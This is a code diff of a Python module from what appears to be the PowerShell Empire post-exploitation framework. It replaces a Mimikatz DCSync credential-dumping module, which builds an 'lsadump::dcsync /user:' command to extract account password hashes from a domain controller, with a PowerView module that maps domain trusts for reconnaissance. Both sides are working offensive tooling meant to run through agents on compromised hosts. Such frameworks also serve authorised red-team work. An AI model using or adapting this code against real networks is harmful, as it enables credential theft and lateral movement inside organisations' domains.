@@ -5,15 +5,11 @@ class Module:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Invoke-Mimikatz DCsync',
+            'Name': 'Invoke-MapDomainTrust',
 
-            'Author': ['@gentilkiwi', '@JosephBialek'],
+            'Author': ['@harmj0y'],
 
-            'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
-                            "to extract a given account password through "
-                            "Mimikatz's lsadump::dcsync module. This doesn't "
-                            "need code execution on a given DC, but needs to be "
-                            "run from a user context with DA equivalent privileges."),
+            'Description': ('Maps all reachable domain trusts with .CSV output. Part of PowerView.'),
 
             'Background' : True,
 
@@ -22,12 +18,11 @@ class Module:
             'NeedsAdmin' : False,
 
             'OpsecSafe' : True,
-
+            
             'MinPSVersion' : '2',
             
             'Comments': [
-                'http://blog.gentilkiwi.com',
-                'http://clymb3r.wordpress.com/'
+                'https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView'
             ]
         }
 
@@ -40,18 +35,13 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'user' : {
-                'Description'   :   'Username to extract the hash for (domain\username format).',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'domain' : {
-                'Description'   :   'Specified (fqdn) domain to pull for the primary domain/DC.',
+            'LDAP' : {
+                'Description'   :   'Switch. Use LDAP for domain queries (less accurate).',
                 'Required'      :   False,
                 'Value'         :   ''
             },
-            'dc' : {
-                'Description'   :   'Specified (fqdn) domain controller to pull replication data from.',
+            'DomainController' : {
+                'Description'   :   'Domain controller to reflect LDAP queries through.',
                 'Required'      :   False,
                 'Value'         :   ''
             }
@@ -60,7 +50,7 @@ class Module:
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
-        
+
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
@@ -70,8 +60,10 @@ class Module:
 
     def generate(self):
         
-        # read in the common module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
+        moduleName = self.info["Name"]
+        
+        # read in the common powerview.ps1 module source code
+        moduleSource = self.mainMenu.installPath + "/data/module_source/situational_awareness/network/powerview.ps1"
 
         try:
             f = open(moduleSource, 'r')
@@ -82,15 +74,20 @@ class Module:
         moduleCode = f.read()
         f.close()
 
-        script = moduleCode
+        # get just the code needed for the specified function
+        script = helpers.generate_dynamic_powershell_script(moduleCode, moduleName)
 
-        script += "Invoke-Mimikatz -Command "
+        script += moduleName + " "
 
-        script += "'\"lsadump::dcsync /user:" + self.options['user']['Value']
+        for option,values in self.options.iteritems():
+            if option.lower() != "agent":
+                if values['Value'] and values['Value'] != '':
+                    if values['Value'].lower() == "true":
+                        # if we're just adding a switch
+                        script += " -" + str(option)
+                    else:
+                        script += " -" + str(option) + " " + str(values['Value']) 
 
-        if self.options["domain"]['Value'] != "":
-            script += " /domain:" + self.options['domain']['Value']
-
-        script += "\"';"
+        script += '| ConvertTo-Csv -NoTypeInformation | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
 
         return script
